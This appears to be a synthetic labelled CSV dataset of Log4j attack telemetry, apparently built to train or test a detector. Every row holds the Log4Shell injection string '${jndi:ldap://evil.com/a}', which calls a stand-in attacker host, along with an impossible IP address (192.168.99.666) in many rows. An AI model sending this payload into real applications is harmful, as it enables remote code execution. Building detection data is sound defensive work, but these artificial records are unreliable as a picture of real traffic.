timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.050677,192.168.1.19,104.21.45.67,java.exe,8a36ffeb1437b79eb299b1e0c5cb1bbb9a0ee5e52d4bce0234cbd18090ac5f0e,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.487,log4j_attack
2025-11-28T06:19:56.050692,192.168.1.66,185.199.108.33,java.exe,3770904f27ae542cfe2653f19ef4e5538e017ffa0ece2ad7800607c77d9681bd,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.889,log4j_attack
2025-11-28T06:19:56.050707,192.168.1.146,185.45.67.88,java.exe,04d41613e2e52e05567fee7c780d8dcc617381e29734689e48ca1ad781df92a7,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.0,log4j_attack
2025-11-28T06:19:56.050723,192.168.1.55,192.168.99.666,java.exe,fe4668a5dbaadcdb5bc047fd9187833f6184920787a94341dae7fd2dab056084,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.38,log4j_attack
2025-11-28T06:19:56.050739,192.168.1.90,185.199.108.33,java.exe,e36e4473f4442013a7ffe0ac769b20f1fd884983b97e5c0333b8235a5820e20e,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.939,log4j_attack
2025-11-28T06:19:56.050754,192.168.1.76,45.32.123.99,java.exe,858bda94ef98096349b764987753389fde211f6fd334a79b0aa08cdae23cdabe,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.254,log4j_attack
2025-11-28T06:19:56.050769,192.168.1.52,185.199.108.33,java.exe,0632767a861b25669eca57e1184c471ebee49a97b89deba6eb65561ea7e4a1ef,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.018,log4j_attack
2025-11-28T06:19:56.050785,192.168.1.22,45.32.123.99,java.exe,b7c6d8891945f4738ba5f9e7b05b3e95453fcff77ab486c3b10a6dbb068f1dab,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.258,log4j_attack
2025-11-28T06:19:56.050801,192.168.1.70,104.21.45.67,java.exe,6ecd425da5fff9c4f407b6875cc19a1ef1ab97e3d06dfa1be6cc10ceb7b7446d,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.434,log4j_attack
2025-11-28T06:19:56.050816,192.168.1.168,192.168.99.666,java.exe,53cc3409898618d39ca8dc46ce8351afc72362b4baf63659b3c680cfbd56fc8c,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.419,log4j_attack
2025-11-28T06:19:56.050831,192.168.1.217,192.168.99.666,java.exe,23e1151d2fb77b3c0e8f989ab6b766177319c5735f4e6255e71f38d427409644,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.312,log4j_attack
2025-11-28T06:19:56.050847,192.168.1.29,185.199.108.33,java.exe,6b361664654e02889bae8e9b459096b9874f74e51594c0bc6b9287bb0ade5d2c,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.037,log4j_attack
2025-11-28T06:19:56.050862,192.168.1.15,185.45.67.88,java.exe,480cbfc3d0624d1f67218ae9302242a7649d377ac423a0a4db00216e0f921786,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.1,log4j_attack
2025-11-28T06:19:56.050878,192.168.1.126,185.45.67.88,java.exe,7d54642a2cbb48b8e51eef5a48965a4a91fc552868921a2cfad4b2d90b9a2535,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.813,log4j_attack
2025-11-28T06:19:56.050905,192.168.1.235,185.45.67.88,java.exe,a564987d6361d2ca8c8b67121b842a36bad83f2cb5d2cc9ee6a5918c31801056,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.499,log4j_attack
2025-11-28T06:19:56.050920,192.168.1.168,45.32.123.99,java.exe,e3446557dd33e41a4ff83cc9fef738d094fffb55f4308f57027c808473a92a94,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.205,log4j_attack
2025-11-28T06:19:56.050936,192.168.1.33,185.199.108.33,java.exe,3d7c02a0a316a99b34a86dd110d98285aba1954826ae975d6c094e97a989dc61,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.201,log4j_attack
2025-11-28T06:19:56.050952,192.168.1.129,104.21.45.67,java.exe,04a59489b6001fff4c84e6a5cb2f9a8871db2b6e43e2923404c52fc4a53088c5,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.061,log4j_attack
2025-11-28T06:19:56.050968,192.168.1.184,185.199.108.33,java.exe,e2180cf1e360292b963dfc73384e41108b8046365b978396653ee6e77532f858,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.334,log4j_attack
2025-11-28T06:19:56.050984,192.168.1.115,104.21.45.67,java.exe,66fcb55dc8cf60e2630680987b880a6044fc6389d61295e312e9c96f59da7f65,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.926,log4j_attack
2025-11-28T06:19:56.050999,192.168.1.121,104.21.45.67,java.exe,ce3d5c01da326d7a309f92a243a641e317433ca6d9ebc882483be1a8317516b7,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.38,log4j_attack
2025-11-28T06:19:56.051014,192.168.1.102,192.168.99.666,java.exe,600cb18bb121f2b3c5f5b1ffcf25ae2a487137ed45c063b56682dbda58c421af,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.801,log4j_attack
2025-11-28T06:19:56.051030,192.168.1.91,185.45.67.88,java.exe,6d33eb144fc7ed648eba5c49792751308ae454bb246063f7052a114c5d2cb4ba,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.238,log4j_attack
2025-11-28T06:19:56.051045,192.168.1.81,185.199.108.33,java.exe,6196a06bd9325b1cdf19aa6739cd50ed41e8a37ada3c174e300a054dca2253e4,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.07,log4j_attack
2025-11-28T06:19:56.051060,192.168.1.134,45.32.123.99,java.exe,a7b0400ad96dd5edd73b4ba8b1b749cadae22e73395db11e571461ac882cf331,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.442,log4j_attack
2025-11-28T06:19:56.051075,192.168.1.35,104.21.45.67,java.exe,81ac76a364fb867f6ad43f7cf731d4efc1d555099500e1d8c59d367e3e3df604,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.846,log4j_attack
2025-11-28T06:19:56.051090,192.168.1.67,45.32.123.99,java.exe,f15ccd001c1abbff1ae24ce9b6080af437aac1d27bc6632913e785972bdb8669,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.813,log4j_attack
2025-11-28T06:19:56.051106,192.168.1.176,185.45.67.88,java.exe,98bd0b585716c6dff857b604516087b0fc37bd68779b7ccf689dd8f74336f4a2,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.474,log4j_attack
2025-11-28T06:19:56.051121,192.168.1.114,104.21.45.67,java.exe,ad9c759fb43b90be52a0d3dd46402177bd966c7448c6c3b5a2e893364c5f0a83,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.94,log4j_attack
2025-11-28T06:19:56.051137,192.168.1.238,104.21.45.67,java.exe,5933df83e7a57337462c8b8211ed582262e43a64727d20f0db7cac1d951728d3,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.922,log4j_attack
2025-11-28T06:19:56.051152,192.168.1.55,192.168.99.666,java.exe,cd5ec00db14ffa159977d1b4ebc59ce1c95fd2820be2f6c581eebe418abdd742,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.344,log4j_attack
2025-11-28T06:19:56.051167,192.168.1.57,185.45.67.88,java.exe,01cf105b784ea9b171a197adba4484e3089397ba785037a12bafa5c205af85b5,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.161,log4j_attack
2025-11-28T06:19:56.051182,192.168.1.57,45.32.123.99,java.exe,0b312a8b26ff73f9da0a2959b2c2a4fffa5a034629c67f257b2fa95a370d56a6,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.494,log4j_attack
2025-11-28T06:19:56.051197,192.168.1.136,104.21.45.67,java.exe,88b81cfc5ca5a34abe9a4baa1ce4984c2178b73a9fbaa5bd1ee090de7a13be85,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.057,log4j_attack
2025-11-28T06:19:56.051212,192.168.1.138,185.45.67.88,java.exe,c795513959b2627f2c4d87ce108827fbcbde2429624264a4519cfbee50d35659,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.386,log4j_attack
2025-11-28T06:19:56.051227,192.168.1.165,192.168.99.666,java.exe,d779ab1315bcbed692d4e1f432ccf443863b6dd9a9b701677d8394753e2bcb96,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.924,log4j_attack
2025-11-28T06:19:56.051242,192.168.1.112,104.21.45.67,java.exe,6d8a6ec2d5f1852bf1ae5a453ec6b86c2acc44d630a7922d220ae69c78d2639c,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.394,log4j_attack
2025-11-28T06:19:56.051257,192.168.1.98,192.168.99.666,java.exe,3ee72eb3e190e507ff8d33394c8736f3c0251f557d97b049e676eb64e790b5e3,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.313,log4j_attack
2025-11-28T06:19:56.051273,192.168.1.53,104.21.45.67,java.exe,803d580b618196ea7b715f497272dbd1e18ddcd9aea25ce424b68edc066c048a,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.374,log4j_attack
2025-11-28T06:19:56.051288,192.168.1.96,185.199.108.33,java.exe,cd216264537ec43bb514ecc6cc8c967302c645961b95371ff2cdccc9835100ac,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.936,log4j_attack
2025-11-28T06:19:56.051303,192.168.1.247,104.21.45.67,java.exe,7d2f82c2c8a511ca2675000e7ed3b9c8bc2c68d5f15006e2f2b8ad8e2f9a7e70,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.036,log4j_attack
2025-11-28T06:19:56.051325,192.168.1.144,185.199.108.33,java.exe,6abd28a3413bfa2a987fc6f95235c61e2f84089ec836877911c1a2ce6e8a34dc,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.158,log4j_attack
2025-11-28T06:19:56.051340,192.168.1.46,192.168.99.666,java.exe,f6d8bf632fdbc0c9db64a8639d9c0512544f3b58b0fd303b2095a23d03fc59aa,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.059,log4j_attack
2025-11-28T06:19:56.051355,192.168.1.37,45.32.123.99,java.exe,d7c0fa94dfb644d927bf6cc24c96aaecb5596d3e47fbe5fcb8f1b9b8db4af1cc,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.02,log4j_attack
2025-11-28T06:19:56.051371,192.168.1.104,104.21.45.67,java.exe,a47b527563090ac3a4616cbf34cb2ad0c56f1ad2fb6da01df96e2bbda7aa378b,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.012,log4j_attack
2025-11-28T06:19:56.051386,192.168.1.198,192.168.99.666,java.exe,104b90836d6b8f12503203814bdc103c6bda41152fd251e56f265bbba0984473,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.451,log4j_attack
2025-11-28T06:19:56.051401,192.168.1.94,104.21.45.67,java.exe,574ef536158cd6ea9600c14ac6138db98d39f2687742ee15412d4231f50ebeec,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.39,log4j_attack
2025-11-28T06:19:56.051416,192.168.1.148,185.199.108.33,java.exe,17adee0246436bda3e0229330799b992a360bea78bea56789fdb98b6ee6d2f9b,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.076,log4j_attack
2025-11-28T06:19:56.051432,192.168.1.52,192.168.99.666,java.exe,0e75b975cc33d3ab331feed751b1d25764e14f17da7fc123657589e5545591de,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.131,log4j_attack
2025-11-28T06:19:56.051447,192.168.1.67,192.168.99.666,java.exe,7489564651976fe7d482414aaeb355981773c7dd338667280ed4445e9523093f,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.976,log4j_attack
2025-11-28T06:19:56.051462,192.168.1.128,45.32.123.99,java.exe,49a3c94fdc9ee89b73cab90227c07037a850da5a66ff51874bf6134973c5357e,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.987,log4j_attack
2025-11-28T06:19:56.051477,192.168.1.150,185.45.67.88,java.exe,fce47795297d2da07eff001c7c7ae02d24ca491f048a568f403a63024712797d,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.393,log4j_attack
2025-11-28T06:19:56.051493,192.168.1.137,185.45.67.88,java.exe,a8adbedc92725c2f364a55538b55539513ff2e2a899f14d8eacf39e0897e7ebf,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.286,log4j_attack
2025-11-28T06:19:56.051508,192.168.1.108,185.199.108.33,java.exe,045de8cc5e8225cf4827845001e9e721affb72556fe670713f394203cc99149f,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.845,log4j_attack
2025-11-28T06:19:56.051524,192.168.1.72,185.45.67.88,java.exe,cf40af7eb45986917d8dcaf4c86eaed1cace4bd1ef8bdd4c0af55b1cebe68dcf,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.345,log4j_attack
2025-11-28T06:19:56.051539,192.168.1.49,45.32.123.99,java.exe,db0f7df9e14b6480399c5c5c42ef9d79af53fb00eac511bd657da66e058a9ac7,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.969,log4j_attack
2025-11-28T06:19:56.051554,192.168.1.99,45.32.123.99,java.exe,e6220da377e657e5471a2f2d299289e7b46b6703b50f801398783c2f10c556eb,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.495,log4j_attack
2025-11-28T06:19:56.051570,192.168.1.85,192.168.99.666,java.exe,ed08d912f1355b0ee8ca52c5eba90779ea8dc679792b26289b8a88a77b571559,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.499,log4j_attack
2025-11-28T06:19:56.051586,192.168.1.17,185.45.67.88,java.exe,63479ca7e6c8f67fddaf48136ddb999a724c36b94a23c4d41546d90d006efc8c,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.366,log4j_attack
2025-11-28T06:19:56.051601,192.168.1.221,185.45.67.88,java.exe,2dac71d55e5d7f563da947191c96c5ada89834b63e3c25e9014b62ab3aa95f2d,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.887,log4j_attack
2025-11-28T06:19:56.051616,192.168.1.67,104.21.45.67,java.exe,6938bafe6934f00624388734daac77165c48fb4d696b2c0ad3a43ed4f1869dd4,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.408,log4j_attack
2025-11-28T06:19:56.051631,192.168.1.97,185.45.67.88,java.exe,2f76733b905db82a0fee09a4d5fbd47dc68758716a8874a300413ee886b6cb9f,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.288,log4j_attack
2025-11-28T06:19:56.051646,192.168.1.247,185.199.108.33,java.exe,6e0d380f0c14b01173c066a59b0efbbbbc8d3a99113458c5de1ffef532f9b48a,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.366,log4j_attack
2025-11-28T06:19:56.051662,192.168.1.19,185.45.67.88,java.exe,21fbca58ba4dea0c49dcf1eb9c2431de095aac8e62529b236c20bfdd4b4e42e8,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.211,log4j_attack
2025-11-28T06:19:56.051677,192.168.1.100,104.21.45.67,java.exe,68a774856b7d7e78bad90c04fbbeb451ff97a1c801cb4732918569db4d63ca9a,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.203,log4j_attack
2025-11-28T06:19:56.051692,192.168.1.224,185.45.67.88,java.exe,2f477fca6cdf3b633c2792251228b52ec94ad9fa0b12d384256935c6dd4ef172,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.868,log4j_attack
2025-11-28T06:19:56.051707,192.168.1.52,45.32.123.99,java.exe,2ac687a61e0fe201e261dde8f26c84fcc34f8b14b1483b609baa516118d229ae,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.114,log4j_attack
2025-11-28T06:19:56.051722,192.168.1.139,185.199.108.33,java.exe,ea45e1e4af4567548bbe1f4131d67df5cde018bb890f139619e7ce88d726ba85,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.227,log4j_attack
2025-11-28T06:19:56.051737,192.168.1.50,185.199.108.33,java.exe,951f4d73037f1a825c1fa994acc09e92afc729476d379d235a4f1e1791deb383,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.241,log4j_attack
2025-11-28T06:19:56.051752,192.168.1.59,45.32.123.99,java.exe,fc0e1bcf4513d68f20dfca56ecad22ff2fe28cd67a28298bedfd259562ef8e84,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.806,log4j_attack
2025-11-28T06:19:56.051767,192.168.1.197,185.199.108.33,java.exe,6006b8bd46b2b12922c9d313772acfa38297ca39120ed45b6a179479a4c5ca69,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.428,log4j_attack
2025-11-28T06:19:56.051782,192.168.1.184,185.199.108.33,java.exe,72c747b346d1ce022e6b9092e0426e59e805e551b920b3540b7a599ff09de8ff,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.296,log4j_attack
2025-11-28T06:19:56.051798,192.168.1.58,192.168.99.666,java.exe,5c717f2caacfe41c88b8cfdc066bbbeacbe792c1f4a41cf4a6b7c5785947407a,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.092,log4j_attack
2025-11-28T06:19:56.051813,192.168.1.37,45.32.123.99,java.exe,df21dbf6665aa785bf0863d66c225234170af4f23b20aaab7632af8c44e038b6,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.007,log4j_attack
2025-11-28T06:19:56.051829,192.168.1.88,185.199.108.33,java.exe,7040807467a7aeed3a7477477ddca256cd4786a32ed73775892ed950c8507f27,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.156,log4j_attack
2025-11-28T06:19:56.051845,192.168.1.115,104.21.45.67,java.exe,50037e8b274e21864790060654a4bddc2c69cfd7e2e2c8f23b0da5be0c2fa18f,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.983,log4j_attack
2025-11-28T06:19:56.051860,192.168.1.150,185.45.67.88,java.exe,55ad78e6febe1bc40a8a106fdec05c44c818f58961b9e310d346f6060d8e2617,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.898,log4j_attack
2025-11-28T06:19:56.051875,192.168.1.28,185.199.108.33,java.exe,aacf1e936b91c75f46b4d1e2b0fea3e9d0d102fc466196b4e04ab8d0863a8abe,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.233,log4j_attack
2025-11-28T06:19:56.051900,192.168.1.22,185.199.108.33,java.exe,fe652f1a2e86bfc3d557aedbe51beb3ab090311c25134ad01770e4f17b3bc8df,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.918,log4j_attack
2025-11-28T06:19:56.051916,192.168.1.158,192.168.99.666,java.exe,ed073c4a7155428e0aa3181eca1b12832341575e8db246959ccccceb8de3ce43,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.206,log4j_attack
2025-11-28T06:19:56.051931,192.168.1.13,45.32.123.99,java.exe,7672e86da51e83074060f20adf970cc792ba2cc3e3f00df1aca656117f927d19,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.115,log4j_attack
2025-11-28T06:19:56.051946,192.168.1.77,104.21.45.67,java.exe,34b338109c184e1a687110ee40f92519b311840b1e3c72983fabaa53bc1b72d6,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.13,log4j_attack
2025-11-28T06:19:56.051962,192.168.1.95,45.32.123.99,java.exe,1aef48b04f9c61b679f9e2c9666dcd7b7afa2c9a286024f2fbfd38caac8d8e9a,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.211,log4j_attack
2025-11-28T06:19:56.051978,192.168.1.243,185.45.67.88,java.exe,b4da77c334533ac8b8584058d4166bc876879f39ad26e5fc4239d2015dbfe357,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.211,log4j_attack
2025-11-28T06:19:56.051993,192.168.1.32,192.168.99.666,java.exe,5827da933a264beca619babe1050d6c09fe6e88acd78bea47487893c67d94375,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.361,log4j_attack
2025-11-28T06:19:56.052008,192.168.1.78,185.199.108.33,java.exe,334ced4759ef81118bf0c31bc5774d9d0702ebf4847043adbadbc2ceaabf7f9b,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.219,log4j_attack
2025-11-28T06:19:56.052023,192.168.1.37,104.21.45.67,java.exe,93059e3dd3ee842e4760bc6545c049889223aeb6a2b0969016cf7048db141201,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.929,log4j_attack
2025-11-28T06:19:56.052038,192.168.1.72,45.32.123.99,java.exe,9b440fedcba01a3c26b6c9e3f20e1364f0b5ea70e3a755e9567f940798129ce3,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.099,log4j_attack
2025-11-28T06:19:56.052053,192.168.1.218,185.199.108.33,java.exe,35f262a81a5e4c686aac9d41ee6c57eb4b75dc7c73355e273eaf29d49ebe6cfd,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.05,log4j_attack
2025-11-28T06:19:56.052069,192.168.1.198,192.168.99.666,java.exe,777f162edb7296d79bd7a94241c6cb8d60cdae079a84d8a5abea34dce009bcac,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.875,log4j_attack
2025-11-28T06:19:56.052084,192.168.1.180,185.45.67.88,java.exe,f7ae4dca42c17bd4b4166631ec5e8348bfe07dabdce50d267abedb0ad3efc5be,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.252,log4j_attack
2025-11-28T06:19:56.052100,192.168.1.112,185.199.108.33,java.exe,a9c8c1c4d6668918346c7759ee22fbba676a702e26b95353aa4178d3938f910d,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.418,log4j_attack
2025-11-28T06:19:56.052115,192.168.1.178,45.32.123.99,java.exe,1bc6227aea840e60107e3731d36c1048eec5ba635abcc7f88ba56bc3b7a7a806,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.19,log4j_attack
2025-11-28T06:19:56.052130,192.168.1.177,185.199.108.33,java.exe,66e3a80cd47d2f81a119d4781bf751c98757b29ca0a370c04f1661c13ce60d55,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.387,log4j_attack
2025-11-28T06:19:56.052146,192.168.1.187,104.21.45.67,java.exe,0a22acd9e8c1a5c35c306b7f51b4562e1e90415e53f7ea6711190ebd568726d6,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.823,log4j_attack
2025-11-28T06:19:56.052161,192.168.1.143,45.32.123.99,java.exe,7e9d4a323e9ad8e66b3f94375733debd6b33dc81695803f028b00078dab2197f,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.031,log4j_attack
2025-11-28T06:19:56.052176,192.168.1.101,104.21.45.67,java.exe,3852361fe2a355edcbfacf9c35d32d14fa3951a9c1e1e13bfa6826a8ba7e7da6,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.331,log4j_attack
2025-11-28T06:19:56.052191,192.168.1.156,192.168.99.666,java.exe,47ca8b2c5db3f2da8e1a8ae707641f705c413da3c1a0c4328c1ebeb5d933ba8d,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.082,log4j_attack
2025-11-28T06:19:56.052206,192.168.1.143,192.168.99.666,java.exe,a43771e2c63511a36c636387a60a9bbcb127b96cef1ac2da3477c9db2e588e27,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.371,log4j_attack
2025-11-28T06:19:56.052222,192.168.1.226,45.32.123.99,java.exe,43dfa9edc00211529b08ebad071e525f60ab4d63b571b56cbdc904ef6a3271c6,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.333,log4j_attack
2025-11-28T06:19:56.052237,192.168.1.65,185.199.108.33,java.exe,d6aa4e9fbef74f436be66626d189855c2a6a04ed8284e41a12ef4d9c26b0a24a,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.917,log4j_attack
2025-11-28T06:19:56.052252,192.168.1.59,185.199.108.33,java.exe,8cccd9566fd624e63dbe72165f7267e3168fde7478d5f1bb41095411fa9c6fe3,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.023,log4j_attack
2025-11-28T06:19:56.052268,192.168.1.140,104.21.45.67,java.exe,b7b025d642eccc42b3788cd86bfb68a4f82f929e6b80b4972f89d21f72f6206b,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.85,log4j_attack
2025-11-28T06:19:56.052283,192.168.1.148,192.168.99.666,java.exe,40c584fdd891d0cb74ea98ffb897cb1dcc469f0557d0f2cb615173fb5daa73a4,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.192,log4j_attack
2025-11-28T06:19:56.052298,192.168.1.250,192.168.99.666,java.exe,c7c05f08ca344f69847cad7ba302a930e3ca554ccce927cdd934e58ac5e7678d,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.956,log4j_attack
2025-11-28T06:19:56.052320,192.168.1.14,104.21.45.67,java.exe,021a1d223311bd924295222fd1229723ef911b7116ec1946a4d421b68a8ee2ef,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.232,log4j_attack
2025-11-28T06:19:56.052335,192.168.1.80,185.199.108.33,java.exe,cf35588d90b73163f4a60b0295a1283ea9b3fe4aa4fc103a78f65d6e24947812,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.412,log4j_attack
2025-11-28T06:19:56.052350,192.168.1.57,185.199.108.33,java.exe,b784b3e7350790a57bcb2e7ecae4b5a9b1cb011131fce138885194fd12099cb4,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.122,log4j_attack
2025-11-28T06:19:56.052365,192.168.1.150,45.32.123.99,java.exe,02134ce68499459bc837ca618499ab5f10c86984dd1d0916781979b718668bde,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.176,log4j_attack
2025-11-28T06:19:56.052381,192.168.1.33,45.32.123.99,java.exe,c8922c9b7e54ff897a85e26f3ebbc7fa0de3482be0b177e9f5c296763a50a609,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.165,log4j_attack
